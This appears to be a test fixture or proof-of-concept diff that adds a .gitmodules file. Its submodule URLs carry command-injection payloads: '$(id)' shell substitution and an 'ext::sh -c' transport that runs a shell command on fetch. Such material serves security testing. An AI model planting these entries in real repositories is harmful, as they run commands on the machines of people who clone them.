@@ -1,0 +1,6 @@
+[submodule "pwned"]
+    path = pwned
+    url = https://$(id)@github.com/test/repo.git
+[submodule "evil"]
+    path = evil
+    url = ext::sh -c id% >&2
